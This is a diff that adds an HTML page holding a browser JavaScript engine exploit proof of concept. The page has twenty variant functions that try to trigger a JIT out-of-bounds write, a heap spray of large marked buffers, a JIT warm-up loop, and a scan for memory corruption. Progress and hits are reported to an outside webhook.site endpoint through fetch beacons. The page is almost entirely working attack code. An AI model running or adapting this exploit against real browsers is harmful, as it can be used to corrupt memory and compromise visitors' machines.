@@ -1,0 +1,785 @@
+<html><body><script>
+const SINK = 'https://webhook.site/d14b9308-3eca-44e5-8e74-a88903035ea0';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)), {mode:'no-cors'}); } catch(e) {}
+}
+var N = 0;
+try { N = parseInt(localStorage.getItem('esc5_i') || '0', 10); } catch(e) {}
+beacon('load', 'i=' + N);
+var arrx = new Array(150);
+arrx[0] = 1.1;
+var fake = new Uint32Array(10);
+fake[0]= 1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
+var tahir = 1;
+
+
+function poc0(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x100000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc1(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x120000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc2(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x140000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc3(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x160000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc4(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x180000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc5(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x1a0000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc6(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x1c0000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc7(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x1e0000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc8(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x200000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc9(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x220000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc10(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x240000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc11(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x260000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc12(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x280000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc13(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x2a0000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc14(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x2c0000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc15(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x2e0000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc16(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x300000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc17(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x320000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc18(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x340000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+function poc19(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x360000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+
+// spray
+var NB = 8, SZB = 32 * 1024 * 1024;
+var bufs = [];
+try { for (var b = 0; b < NB; b++) { var u = new Uint32Array(SZB / 4); u.fill(0xABABABAB); bufs.push(u); } } catch(e) { beacon('spray-exc', String(e).slice(0,60)); }
+
+function warm(fn) {
+  var w = 0;
+  for (var i2 = 2; w < 60000; i2++) {
+    var a = i2 % 700;
+    if (a % 5 == 0 && a % 7 == 0) continue;
+    fn(a); w++;
+  }
+}
+var FNS = [
+poc0, poc1, poc2, poc3, poc4, poc5, poc6, poc7, poc8, poc9, poc10, poc11, poc12, poc13, poc14, poc15, poc16, poc17, poc18, poc19
+];
+
+// warm only the current variant (crash before others warmed is fine)
+warm(FNS[N]);
+beacon('shot', 'i=' + N + ' off=0x' + (0x100000000 + N * 0x20000000).toString(16));
+try { FNS[N](35); } catch(e) { beacon('exc', String(e).slice(0,60)); }
+beacon('survived', 'i=' + N);
+try { localStorage.setItem('esc5_i', String(N + 1)); } catch(e) {}
+for (var b = 0; b < bufs.length; b++) {
+  var u = bufs[b];
+  for (var w2 = 0; w2 < u.length; w2++) {
+    if (u[w2] !== 0xABABABAB) { beacon('HIT', 'buf=' + b + ' w=' + w2 + ' v=0x' + (u[w2]>>>0).toString(16)); break; }
+  }
+}
+</script></body></html>
